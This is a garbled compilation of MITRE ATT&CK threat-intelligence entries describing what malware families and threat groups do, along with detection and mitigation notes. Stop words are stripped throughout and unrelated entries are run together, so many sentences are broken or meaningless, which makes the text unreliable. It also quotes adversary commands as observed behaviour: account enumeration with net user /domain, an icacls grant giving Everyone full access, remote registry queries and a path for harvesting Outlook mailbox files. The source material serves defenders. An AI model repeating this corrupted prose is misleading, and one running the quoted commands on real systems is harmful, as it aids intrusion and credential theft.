detection.(Citation: ClearSky Lazarus Aug 2020) Monitor execution command-line arguments applications adversary gain Initial Access require user interaction. includes compression applications, zip files, [Deobfuscate/Decode Files Information](https://attack.mitre.org/techniques/T1140) payloads. [Trojan.Karagany](https://attack.mitre.org/software/S0094) gather network configuration compromised host.(Citation: Secureworks Karagany July 2019) [NETWIRE](https://attack.mitre.org/software/S0198) perform keylogging.(Citation: McAfee Netwire Mar 2015)(Citation: FireEye APT33 Webinar Sept 2017)(Citation: FireEye NETWIRE March 2019)(Citation: Red Canary NETWIRE January 2020)(Citation: Proofpoint NETWIRE December 2020) [IceApple](https://attack.mitre.org/software/S1022) request pull C2.(Citation: CrowdStrike IceApple 2022) legitimate LaunchDaemons unsigned code exploited. Launch Daemons <code>RunAtLoad</code> parameter set true, ensure <code>Program</code> parameter signed code executables alignment enterprise policy. parameters interchangeable others, <code>Program</code> <code>ProgramArguments</code> parameters present. (Citation: launchd Keywords plists) [Shark](https://attack.mitre.org/software/S1019) ability C2 communications.(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021) [Chaes](https://attack.mitre.org/software/S0631) [cmd](https://attack.mitre.org/software/S0106) execute tasks system.(Citation: Cybereason Chaes Nov 2020)  [APT29](https://attack.mitre.org/groups/G0016) administrative accounts connect SMB targeted users.(Citation: CrowdStrike StellarParticle January 2022) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate obfuscation activity network level.  (Citation: TrendMicro Tonto Team October 2020) [Winnti Group](https://attack.mitre.org/groups/G0044) downloaded auxiliary program named ff.exe infected machines.(Citation: Kaspersky Winnti April 2013) Monitor spaces file names, easily checked file monitoring. user's perspective though, hard notice Finder.app command-line Terminal.app. Processes executed binaries non-standard extensions filename suspicious. Refer NIST guidelines creating password policies. (Citation: NIST 800-63-3) [KARAE](https://attack.mitre.org/software/S0215) public cloud-based storage providers command control.(Citation: FireEye APT37 Feb 2018) Configure intrusion prevention devices detect SNMP queries commands unauthorized sources.(Citation: US-CERT-TA18-106A) [AppleSeed](https://attack.mitre.org/software/S0622) ability communicate C2 HTTP.(Citation: Malwarebytes Kimsuky June 2021)(Citation: KISA Operation Muzabi) [Squirrelwaffle](https://attack.mitre.org/software/S1030) packed custom packer hide payloads.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) list user accounts victim's machine.(Citation: ClearSky Lebanese Cedar Jan 2021) [Gold Dragon](https://attack.mitre.org/software/S0249) communication control servers.(Citation: McAfee Gold Dragon) [Kimsuky](https://attack.mitre.org/groups/G0094) executed variety PowerShell scripts.(Citation: EST Kimsuky April 2019)(Citation: CISA AA20-301A Kimsuky)(Citation: Talos Kimsuky Nov 2021)(Citation: KISA Operation Muzabi) [PinchDuke](https://attack.mitre.org/software/S0048) steals credentials compromised hosts. [PinchDuke](https://attack.mitre.org/software/S0048)'s credential stealing functionality believed based source code Pinch credential stealing malware (also LdPinch). Credentials targeted [PinchDuke](https://attack.mitre.org/software/S0048) include sources Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, Outlook.(Citation: F-Secure Dukes) [DarkComet](https://attack.mitre.org/software/S0334) option compress payload UPX MPRESS.(Citation: Malwarebytes DarkComet March 2018) [Kimsuky](https://attack.mitre.org/groups/G0094) observed disabling firewall.(Citation: Securelist Kimsuky Sept 2013) [ComRAT](https://attack.mitre.org/software/S0126) encrypted stored orchestrator code Registry PowerShell script WsqmCons Registry key.(Citation: ESET ComRAT 2020)(Citation: CISA ComRAT Oct 2020)  [Cuba](https://attack.mitre.org/software/S0625) enumerate processes running victim's machine.(Citation: McAfee Cuba April 2021) [Helminth](https://attack.mitre.org/software/S0170) checked domain admin Exchange Trusted Subsystem commands <code>net Exchange Trusted Subsystem /domain</code> <code>net domain admins /domain</code>.(Citation: Unit 42 Playbook Dec 2017) [Machete](https://attack.mitre.org/software/S0409) stores zipped files profile data installed browsers.(Citation: ESET Machete July 2019)  (Citation: Cybereason Kimsuky November 2020) Monitor code artifacts reflectively loading code, abuse .NET functions <code>Assembly.Load()</code> [Native API](https://attack.mitre.org/techniques/T1106) functions <code>CreateThread()</code>, <code>memfd_create()</code>, <code>execve()</code>, <code>execveat()</code>.(Citation: 00sec Droppers)(Citation: S1 Rat Tricks) [APT28](https://attack.mitre.org/groups/G0007) spearphishing emails URL-shortener service masquerade legitimate service redirect targets credential harvesting sites.(Citation: DOJ GRU Indictment Jul 2018)(Citation: ESET Zebrocy 2019)(Citation: District Court Indictment GRU Oct 2018)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Kimsuky](https://attack.mitre.org/groups/G0094) exploit code CVEs.(Citation: KISA Operation Muzabi) [Penquin](https://attack.mitre.org/software/S0587) add executable flag downloaded file.(Citation: Leonardo Turla Penquin 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors PowerShell compromised systems.(Citation: FoxIT Wocao December 2019) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors registered variety domains.(Citation: Bitdefender FunnyDream Campaign November 2020) [OilRig](https://attack.mitre.org/groups/G0049) credential dumping tools [LaZagne](https://attack.mitre.org/software/S0349) steal credentials accounts logged compromised Outlook Access.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT35 2018)(Citation: FireEye APT34 July 2019) [APT38](https://attack.mitre.org/groups/G0082) rundll32.exe execute binaries, scripts, Control Panel Item files execute code proxy avoid triggering security tools.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Avaddon](https://attack.mitre.org/software/S0640) modifies registry persistence UAC bypass.(Citation: Arxiv Avaddon Feb 2021) [Cuba](https://attack.mitre.org/software/S0625) <code>SeDebugPrivilege</code> <code>AdjustTokenPrivileges</code> elevate privileges.(Citation: McAfee Cuba April 2021) [KEYMARBLE](https://attack.mitre.org/software/S0271) capture screenshots victim’s machine.(Citation: US-CERT KEYMARBLE Aug 2018) [ZxShell](https://attack.mitre.org/software/S0412) kill AV products' processes.(Citation: Talos ZxShell Oct 2014)  [menuPass](https://attack.mitre.org/groups/G0045) collected data remote systems mounting network shares <code>net use</code> Robocopy transfer data.(Citation: PWC Cloud Hopper April 2017) [RogueRobin](https://attack.mitre.org/software/S0270) checks running processes evidence running sandbox environment. enumerates processes Wireshark Sysinternals.(Citation: Unit 42 DarkHydrus July 2018) [IndigoZebra](https://attack.mitre.org/groups/G0136) compromised legitimate email accounts spearphishing operations.(Citation: Checkpoint IndigoZebra July 2021) [Kessel](https://attack.mitre.org/software/S0487) exfiltrate credentials POST request, TCP, DNS.(Citation: ESET ForSSHe December 2018) Organizations intentionally register domains deter adversaries creating typosquatting domains. facets technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Gorgon Group](https://attack.mitre.org/groups/G0078) tools [QuasarRAT](https://attack.mitre.org/software/S0262) [Remcos](https://attack.mitre.org/software/S0332).(Citation: Unit 42 Gorgon Aug 2018) Disable Wake-on-LAN environment. [LAPSUS$](https://attack.mitre.org/groups/G1004) gathered employee email addresses, including personal accounts, social engineering initial access efforts.(Citation: MSTIC DEV-0537 Mar 2022) Monitor newly constructed windows registry create modify system-level processes repeatedly execute malicious payloads persistence. easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [DarkVishnya](https://attack.mitre.org/groups/G0105) network sniffing login data. (Citation: Securelist DarkVishnya Dec 2018) [Ursnif](https://attack.mitre.org/software/S0386) peer-to-peer (P2P) network C2.(Citation: NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016) Enable AES Kerberos encryption (or stronger encryption algorithm), RC4, possible.(Citation: AdSecurity Cracking Kerberos Dec 2015) [NETWIRE](https://attack.mitre.org/software/S0198) Native API including <code>CreateProcess</code> <code>GetProcessById</code>, <code>WriteProcessMemory</code>.(Citation: FireEye NETWIRE March 2019) [Amadey](https://attack.mitre.org/software/S1025) overwritten registry persistence.(Citation: BlackBerry Amadey 2020) [Sandworm Team](https://attack.mitre.org/groups/G0034) `move` transfer files network share.(Citation: Dragos Crashoverride 2018)  administrator accounts permissions add component software services day-to-day operations expose potential adversaries unprivileged systems.  Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [QUADAGENT](https://attack.mitre.org/software/S0269) checks exists Registry key HKCU hive scheduled task created.(Citation: Unit 42 QUADAGENT July 2018) [Bazar](https://attack.mitre.org/software/S0534) HTTPS ports 80 443 C2 communications.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020)(Citation: DFIR Conti Bazar Nov 2021) [MCMD](https://attack.mitre.org/software/S0500) ability upload files infected device.(Citation: Secureworks MCMD July 2019) [Sandworm Team](https://attack.mitre.org/groups/G0034) Base64 encoding malware variants. [Sandworm Team](https://attack.mitre.org/groups/G0034) ROT13 encoding, AES encryption compression zlib library Python-based backdoor.(Citation: iSight Sandworm Oct 2014)(Citation: ESET Telebots Dec 2016) preparation attack 2018 Winter Olympics, [Sandworm Team](https://attack.mitre.org/groups/G0034) conducted online partner organizations listed official PyeongChang Olympics partnership site.(Citation: District Court Indictment GRU Unit 74455 October 2020) [DOGCALL](https://attack.mitre.org/software/S0213) capable leveraging cloud storage APIs Cloud, Box, Dropbox, Yandex C2.(Citation: FireEye APT37 Feb 2018)(Citation: Unit 42 Nokki Oct 2018) Monitor plist file modification, suspicious events code execution <code>\~/Library/Scripts</code> <code>\~/Library/Preferences</code>. Also, monitor path pointers modified plist. [BackConfig](https://attack.mitre.org/software/S0475) ability HTTPS C2 communiations.(Citation: Unit 42 BackConfig 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) injected DLL backdoor dllhost.exe svchost.exe.(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: TrendMicro Tropic Trooper 2020) Monitor newly constructed drive letters mount removable media Monitor common cryptomining software process names compromise resource usage. [BACKSPACE](https://attack.mitre.org/software/S0031) achieves persistence creating shortcut CSIDL_STARTUP directory.(Citation: FireEye APT30) Adversaries install AppCertDLL binaries execute technique. Identify block malicious software executed AppCertDLLs functionality application whitelisting (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) [Leviathan](https://attack.mitre.org/groups/G0065) regsvr32 execution.(Citation: Proofpoint Leviathan Oct 2017) (Citation: TrendMicro EarthLusca 2022) [Bandook](https://attack.mitre.org/software/S0234) malicious VBA code target system.(Citation: CheckPoint Bandook Nov 2020) [RedLeaves](https://attack.mitre.org/software/S0153) communicate C2 HTTPS directed.(Citation: FireEye APT10 April 2017)(Citation: Accenture Hogfish April 2018) Monitor newly constructed network connections received untrusted hosts.   [Gazer](https://attack.mitre.org/software/S0168) versions signed valid certificates; faked issued Comodo "Solid Loop Ltd," issued "Ultimate Support Ltd."(Citation: ESET Gazer Aug 2017)(Citation: Securelist WhiteBear Aug 2017) (Citation: SecureWorks BRONZE UNION June 2017) [Chimera](https://attack.mitre.org/groups/G0114) `fsutil fsinfo drives`, `systeminfo`, `vssadmin list shadows` including shadow volumes drive information.(Citation: NCC Chimera January 2021) [FIN4](https://attack.mitre.org/groups/G0085) spearphishing emails attachments (which stolen, legitimate documents compromised accounts) embedded malicious macros.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) Monitor newly executed processes abuse internet browser extensions establish persistence.  [Kimsuky](https://attack.mitre.org/groups/G0094) executed malware <code>regsvr32s</code>.(Citation: KISA Operation Muzabi) [Bazar](https://attack.mitre.org/software/S0534) spread emails embedded malicious links.(Citation: Cybereason Bazar July 2020)(Citation: Zscaler Bazar September 2020)(Citation: CrowdStrike Wizard Spider October 2020) Monitor SAM registry key accessed attempt dump credentials account login credential material, form hash password, operating software. [Peirates](https://attack.mitre.org/software/S0683) stolen service account tokens perform operations.(Citation: Peirates GitHub) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) copied files main drive's recycle bin.(Citation: ESET BackdoorDiplomacy Jun 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors WMI execute commands.(Citation: FoxIT Wocao December 2019) [Meteor](https://attack.mitre.org/software/S0688) ability discover hostname compromised host.(Citation: Check Meteor Aug 2021) [Octopus](https://attack.mitre.org/software/S0340) delivered spearsphishing emails.(Citation: ESET Nomadic Octopus 2018) [APT29](https://attack.mitre.org/groups/G0016) C2 data exfiltration.(Citation: Volexity SolarWinds) [Kasidet](https://attack.mitre.org/software/S0088) ability download execute additional files.(Citation: Zscaler Kasidet) [Group5](https://attack.mitre.org/groups/G0043) disguised malicious binaries layers obfuscation, including encrypting files.(Citation: Citizen Lab Group5) [Silence](https://attack.mitre.org/groups/G0091) modified versions publicly-available tools [Empire](https://attack.mitre.org/software/S0363) [PsExec](https://attack.mitre.org/software/S0029).(Citation: IB Silence Aug 2019) (Citation: SecureList Silence Nov 2017) [Imminent Monitor](https://attack.mitre.org/software/S0434) encrypted spearphish attachments avoid detection email gateways; debugger encrypts sending C2.(Citation: QiAnXin APT-C-36 Feb2019) [Carberp](https://attack.mitre.org/software/S0484) connected C2 servers HTTP.(Citation: Trusteer Carberp October 2010) Enforce principle privilege limiting privileges user accounts authorized accounts modify directory.(Citation: NSA ASD Detect Prevent Shells 2020) [APT-C-36](https://attack.mitre.org/groups/G0099) downloaded binary data domain malicious document opened.(Citation: QiAnXin APT-C-36 Feb2019) [Clambling](https://attack.mitre.org/software/S0660) ability communicate HTTP.(Citation: Trend Micro DRBControl February 2020) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. Monitor cloud logs API calls file object enumeration unusual activity. network discovery techniques occur operation adversary learns environment. Data events viewed isolation, chain behavior lead activities, Collection Exfiltration, based obtained. [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors collected data files compromised networks.(Citation: BlackBerry CostaRicto November 2020) Monitor third-party application logging, messaging, artifacts send spearphishing messages third-party services attempt gain access victim systems.  [APT39](https://attack.mitre.org/groups/G0087) strains malware query Registry.(Citation: FBI FLASH APT39 September 2020) [CallMe](https://attack.mitre.org/software/S0077) capability create reverse victims.(Citation: Scarlet Mimic Jan 2016) [APT19](https://attack.mitre.org/groups/G0073) collected architecture information. [APT19](https://attack.mitre.org/groups/G0073) malware variant Port 22 malware variant gather hostname CPU victim’s machine.(Citation: FireEye APT19)(Citation: Unit 42 C0d0so0 Jan 2016) [FIN8](https://attack.mitre.org/groups/G0061) remote code execution download subsequent payloads.(Citation: FireEye Fin8 2016)(Citation: Bitdefender FIN8 July 2021) (Citation: Unit 42 Gorgon Aug 2018) [ShimRatReporter](https://attack.mitre.org/software/S0445) gathered local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, DHCP status infected host.(Citation: FOX-IT 2016 Mofang) [Meteor](https://attack.mitre.org/software/S0688) hide console window execution decrease visibility victim.(Citation: Check Meteor Aug 2021) [CoinTicker](https://attack.mitre.org/software/S0369) executes bash script establish reverse shell.(Citation: CoinTicker 2019) [WastedLocker](https://attack.mitre.org/software/S0612) ability save execute files alternate data stream (ADS).(Citation: Sentinel Labs WastedLocker July 2020) [SOUNDBITE](https://attack.mitre.org/software/S0157) capable enumerating manipulating files directories.(Citation: FireEye APT32 2017) [ShimRatReporter](https://attack.mitre.org/software/S0445) gathered local privileges infected host.(Citation: FOX-IT 2016 Mofang) [BLINDINGCAN](https://attack.mitre.org/software/S0520) Rundll32 load malicious DLL.(Citation: US-CERT BLINDINGCAN Aug 2020) [Proxysvc](https://attack.mitre.org/software/S0238) lists processes running system.(Citation: McAfee GhostSecret) [Aquatic Panda](https://attack.mitre.org/groups/G0143) attempted harvest credentials LSASS memory dumping.(Citation: CrowdStrike AQUATIC PANDA December 2021) [PlugX](https://attack.mitre.org/software/S0013) RC4 encryption C2 communications.(Citation: Proofpoint TA416 Europe March 2022) Analyze packet contents detect communications follow expected protocol behavior port used. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf [C0015](https://attack.mitre.org/campaigns/C0015), threat actors RDP access specific network hosts interest.(Citation: DFIR Conti Bazar Nov 2021) [CrackMapExec](https://attack.mitre.org/software/S0488) enumerate drives name.(Citation: CME Github September 2018) [BitPaymer](https://attack.mitre.org/software/S0570) copied <code>:bin</code> alternate data stream newly created file.(Citation: Crowdstrike Indrik November 2018) [Chimera](https://attack.mitre.org/groups/G0114) harvested data remote mailboxes including execution <code>\\<hostname>\c$\Users\<username>\AppData\Local\Microsoft\Outlook*.ost</code>.(Citation: NCC Chimera January 2021) Applications send push notifications verify login form multi-factor authentication (MFA). Train users accept valid push notifications report suspicious push notifications. [Windshift](https://attack.mitre.org/groups/G0112) tools deploy additional payloads compromised hosts.(Citation: BlackBerry Bahamut) [BadPatch](https://attack.mitre.org/software/S0337) WMI enumerate installed security products victim’s environment.(Citation: Unit 42 BadPatch Oct 2017) Create static ARP entries networked devices. Implementing static ARP entries infeasible networks. Monitor creation .msc files. MMC legitimately Microsoft-created .msc files, <code>services.msc</code> <code>eventvwr.msc</code>. Invoking non-Microsoft .msc files indicator malicious activity. [Empire](https://attack.mitre.org/software/S0363) enumerate current network connections host.(Citation: Github PowerShell Empire) [Bumblebee](https://attack.mitre.org/software/S1039) relied user downloading file OneDrive link execution.(Citation: Proofpoint Bumblebee April 2022)(Citation: Cybereason Bumblebee August 2022) [SombRAT](https://attack.mitre.org/software/S0615) custom DGA generate subdomain C2.(Citation: BlackBerry CostaRicto November 2020) Monitor newly constructed files scripts automatically executed boot logon initialization establish persistence. [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors scanned ports nbtscan NETBIOS nameservers.(Citation: FoxIT Wocao December 2019) Monitor analyze calls <code>CreateTransaction</code>, <code>CreateFileTransacted</code>, <code>RollbackTransaction</code>, rarely functions indicative TxF activity. Process Doppelgänging invokes outdated undocumented implementation Windows process loader calls <code>NtCreateProcessEx</code> <code>NtCreateThreadEx</code> API calls modify memory process, <code>WriteProcessMemory</code>. (Citation: BlackHat Process Doppelgänging Dec 2017) (Citation: hasherezade Process Doppelgänging Dec 2017) [PoetRAT](https://attack.mitre.org/software/S0428) TLS encrypt command control (C2) communications.(Citation: Talos PoetRAT April 2020) [Clambling](https://attack.mitre.org/software/S0660) ability bypass UAC `passuac.dll` file.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [Matryoshka](https://attack.mitre.org/software/S0167) DNS C2.(Citation: ClearSky Wilted Tulip July 2017)(Citation: CopyKittens Nov 2015) [Leafminer](https://attack.mitre.org/groups/G0077) tool called Total SMB BruteForcer perform internal password spraying.(Citation: Symantec Leafminer July 2018) [Attor](https://attack.mitre.org/software/S0438) set attributes log files directories HIDDEN, SYSTEM, ARCHIVE, combination those.(Citation: ESET Attor Oct 2019) [APT18](https://attack.mitre.org/groups/G0026) collect victim’s machine.(Citation: PaloAlto DNS Requests 2016) (Citation: McAfee Honeybee)  variant [BlackEnergy](https://attack.mitre.org/software/S0089) creates service hard-coded randomly generated name.(Citation: F-Secure BlackEnergy 2014) [Agent Tesla](https://attack.mitre.org/software/S0331) encrypt data 3DES sending C2 server.(Citation: Talos Agent Tesla Oct 2018) [TA551](https://attack.mitre.org/groups/G0127) retrieved DLLs installer binaries malware execution C2.(Citation: Unit 42 TA551 Jan 2021) [Chimera](https://attack.mitre.org/groups/G0114) queried Registry <code>reg query \\<host>\HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers</code> <code>reg query \\<host>\HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Internet Settings</code>.(Citation: NCC Chimera January 2021) [admin@338](https://attack.mitre.org/groups/G0018) actors commands exploitation machine [LOWBALL](https://attack.mitre.org/software/S0042) malware enumerate user accounts: <code>net user >> %temp%\download</code> <code>net user /domain >> %temp%\download</code>(Citation: FireEye admin@338) [Darkhotel](https://attack.mitre.org/groups/G0012) dropped mspaint.lnk shortcut disk launches script downloads executes file.(Citation: Securelist Darkhotel Aug 2015) [WannaCry](https://attack.mitre.org/software/S0366) <code>attrib +h</code> <code>icacls . /grant Everyone:F /T /C /Q</code> files hidden grant users access controls.(Citation: LogRhythm WannaCry) [GravityRAT](https://attack.mitre.org/software/S0237) delivered Word documents DDE execution.(Citation: Talos GravityRAT) Detecting software exploitation difficult depending tools available. Software exploits succeed exploited process unstable crash. Monitor third-party application logging, messaging, service artifacts provide context user authentication applications, including cloud-based services. Combine credentials usage events identify authentication events fit organization baseline. [Zebrocy](https://attack.mitre.org/software/S0251) stores collected single file exfiltration.(Citation: ESET Zebrocy Nov 2018) [APT39](https://attack.mitre.org/groups/G0087) Ncrack reveal credentials.(Citation: FireEye APT39 Jan 2019) [Olympic Destroyer](https://attack.mitre.org/software/S0365) [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) enumerate systems network.(Citation: Talos Olympic Destroyer 2018) [Umbreon](https://attack.mitre.org/software/S0221) access SSH protocol PAM authenticate.(Citation: Umbreon Trend Micro) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Disallow restrict removable media organizational policy level required business operations.(Citation: TechNet Removable Media Control) [Magic Hound](https://attack.mitre.org/groups/G0059) registered fraudulent domains "mail-newyorker.com" "news12.com.recover-session-service.site" target specific victims phishing attacks.(Citation: Certfa Charming Kitten January 2021) [Volatile Cedar](https://attack.mitre.org/groups/G0123) targeted publicly facing servers, automatic manual vulnerability discovery.(Citation: CheckPoint Volatile Cedar March 2015) (Citation: ClearSky Lebanese Cedar Jan 2021)  (Citation: Kaspersky Carbanak) [APT41](https://attack.mitre.org/groups/G0096) compiled (.chm) files targeting.(Citation: FireEye APT41 Aug 2019)  [Inception](https://attack.mitre.org/groups/G0100) VBScript execute malicious commands payloads.(Citation: Unit 42 Inception November 2018)(Citation: Kaspersky Cloud Atlas December 2014) Monitor firewall rules, unexpected modifications allowing cleaning previous tampering enabled malicious network traffic. Identify running processes raw sockets. Ensure processes listed raw socket enterprise policy.(Citation: crowdstrike bpf socket filters) [SHUTTERSPEED](https://attack.mitre.org/software/S0217) download execute arbitary executable.(Citation: FireEye APT37 Feb 2018) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors pass-the-hash tools authenticated access sensitive internal desktops servers.(Citation: McAfee Night Dragon) technical controls prevent disabling services deletion files involved recovery.  [APT12](https://attack.mitre.org/groups/G0005) [RIPTIDE](https://attack.mitre.org/software/S0003), RAT communicate.(Citation: Moran 2014) [ConnectWise](https://attack.mitre.org/software/S0591) screenshots remote hosts.(Citation: Anomali Static Kitten February 2021) [POWRUNER](https://attack.mitre.org/software/S0184) download upload files C2 server.(Citation: FireEye APT34 Dec 2017) Monitor analyze calls functions  `GetProcAddress()` malicious code obfuscation.(Citation: Huntress API Hash) [Andariel](https://attack.mitre.org/groups/G0138) attempted lure victims enabling malicious macros email attachments.(Citation: AhnLab Andariel Subgroup Lazarus June 2018) Network segmentation isolate infrastructure components require broad network access. mitigate, alleviate, scope AiTM activity. [Zebrocy](https://attack.mitre.org/software/S0251) executes <code>reg query</code> command Registry.(Citation: ESET Zebrocy 2019) [IronNetInjector](https://attack.mitre.org/software/S0581) ability inject DLL running processes, including [IronNetInjector](https://attack.mitre.org/software/S0581) DLL explorer.exe.(Citation: Unit 42 IronNetInjector February 2021 ) (Citation: Mandiant FIN5 GrrCON Oct 2016) [Tropic Trooper](https://attack.mitre.org/groups/G0081) function automatically exfiltrate sensitive data air-gapped systems USB storage.(Citation: TrendMicro Tropic Trooper 2020)	 [Tropic Trooper](https://attack.mitre.org/groups/G0081) <code>netview</code> scan target systems shared resources.(Citation: TrendMicro TropicTrooper 2015) [ROKRAT](https://attack.mitre.org/software/S0240) capture screenshots infected `gdi32` library.(Citation: Talos ROKRAT)(Citation: Talos ROKRAT 2)(Citation: Securelist ScarCruft 2019)(Citation: NCCGroup RokRat Nov 2018)(Citation: Malwarebytes RokRAT VBA January 2021) [Dragonfly](https://attack.mitre.org/groups/G0035) accessed email accounts Outlook Access.(Citation: US-CERT TA18-074A) [Bandook](https://attack.mitre.org/software/S0234) modules capable capturing video victim's webcam.(Citation: EFF Manul Aug 2016) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Monitor executed commands arguments common cryptomining functionality  [Pasam](https://attack.mitre.org/software/S0208) creates backdoor remote attackers retrieve hostname disk space.(Citation: Symantec Pasam 2012) [Cardinal RAT](https://attack.mitre.org/software/S0348) collect hostname, Windows version, processor architecture victim machine.(Citation: PaloAlto CardinalRat Apr 2017) [Cobalt Group](https://attack.mitre.org/groups/G0080) Plink utility create SSH tunnels.(Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Dec 2016)(Citation: IB Cobalt Aug 2017) [Remcos](https://attack.mitre.org/software/S0332) command keylogging.(Citation: Fortinet Remcos Feb 2017)(Citation: Talos Remcos Aug 2018) [APT38](https://attack.mitre.org/groups/G0082) DYEPACK.FOX manipulate PDF data accessed remove traces fraudulent SWIFT transactions data displayed user.(Citation: FireEye APT38 Oct 2018) [Wizard Spider](https://attack.mitre.org/groups/G0102) exfiltrated domain credentials network enumeration command control (C2) channels.(Citation: CrowdStrike Grim Spider 2019) [Mustang Panda](https://attack.mitre.org/groups/G0129) custom batch scripts collect files automatically targeted system.(Citation: Secureworks BRONZE PRESIDENT December 2019) [APT29](https://attack.mitre.org/groups/G0016) <code>AUDITPOL</code> prevent collection audit logs.(Citation: Deep Dive Solorigate January 2021) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure) trusted entity. correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Derusbi](https://attack.mitre.org/software/S0021) binds raw socket random source port 31800 31900 C2.(Citation: Fidelis Turbo) [Neoichor](https://attack.mitre.org/software/S0691) Internet Explorer (IE) interface connect receive commands C2.(Citation: NICKEL December 2021) [Windshift](https://attack.mitre.org/groups/G0112) WMI collect target machines.(Citation: BlackBerry Bahamut) [Agent Tesla](https://attack.mitre.org/software/S0331) SMTP C2 communications.(Citation: DigiTrust Agent Tesla Jan 2017)(Citation: Fortinet Agent Tesla June 2017)(Citation: Bitdefender Agent Tesla April 2020) [APT29](https://attack.mitre.org/groups/G0016) granted `company administrator` privileges newly created service principal.(Citation: CrowdStrike StellarParticle January 2022)  technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Maze](https://attack.mitre.org/software/S0449) gathered running processes.(Citation: McAfee Maze March 2020)	 [Rancor](https://attack.mitre.org/groups/G0075) <code>msiexec</code> download execute malicious installer files HTTP.(Citation: Rancor Unit42 June 2018) [Mosquito](https://attack.mitre.org/software/S0256) executes cmd.exe pipe read send output C2 server.(Citation: ESET Turla Mosquito Jan 2018) Monitor newly constructed  processes command-lines involved data destruction activity, vssadmin, wbadmin, bcdedit. [PyDCrypt](https://attack.mitre.org/software/S1032) probed victim machines <code>whoami</code> collected username machine.(Citation: Checkpoint MosesStaff Nov 2021) Enforce authentication role-based access control container API restrict users privileges required.(Citation: Kubernetes Hardening Guide) [NETWIRE](https://attack.mitre.org/software/S0198) create scheduled task establish persistence.(Citation: FireEye NETWIRE March 2019) Monitor API calls create modify system-level processes repeatedly execute malicious payloads persistence. [POWERSOURCE](https://attack.mitre.org/software/S0145) DNS TXT records C2.(Citation: FireEye FIN7 March 2017)(Citation: Cisco DNSMessenger March 2017) [NOKKI](https://attack.mitre.org/software/S0353) C2 communications.(Citation: Unit 42 NOKKI Sept 2018) [APT28](https://attack.mitre.org/groups/G0007) tool captures air-gapped computers infected USB transfers network-connected USB inserted.(Citation: SIR 19) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors [netstat](https://attack.mitre.org/software/S0104) discover network connections remote systems.(Citation: Bitdefender FunnyDream Campaign November 2020) [Zebrocy](https://attack.mitre.org/software/S0251) command delete files directories.(Citation: ESET Zebrocy Nov 2018)(Citation: ESET Zebrocy 2019)(Citation: CISA Zebrocy Oct 2020) [Power Loader](https://attack.mitre.org/software/S0177) overwrites Explorer’s Shell_TrayWnd extra window memory redirect execution NTDLL function abused assemble execute return-oriented programming (ROP) chain create malicious thread Explorer.exe.(Citation: MalwareTech Power Loader Aug 2013)(Citation: WeLiveSecurity Gapz Redyms Mar 2013) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [MoonWind](https://attack.mitre.org/software/S0149) obtains victim IP address.(Citation: Palo Alto MoonWind March 2017) [PLEAD](https://attack.mitre.org/software/S0435) `ShellExecute` execute applications.(Citation: TrendMicro BlackTech June 2017) Monitor logs actions gather container infrastructure, including discovery API calls unexpected users. Monitor account activity logs actions performed activity Kubernetes dashboard applications. [Dacls](https://attack.mitre.org/software/S0497) establish persistence Launch Daemon.(Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls 2020) [Mustang Panda](https://attack.mitre.org/groups/G0129) downloaded additional executables initial infection stage.(Citation: Recorded Future REDDELTA July 2020) Monitor contextual data malicious payload, compilation times, file hashes, watermarks identifiable configuration information. activity visibility target organization, detection behavior difficult. Detection efforts focused post-compromise phases adversary lifecycle. [Inception](https://attack.mitre.org/groups/G0100) decoy documents load malicious remote payloads HTTP.(Citation: Unit 42 Inception November 2018) 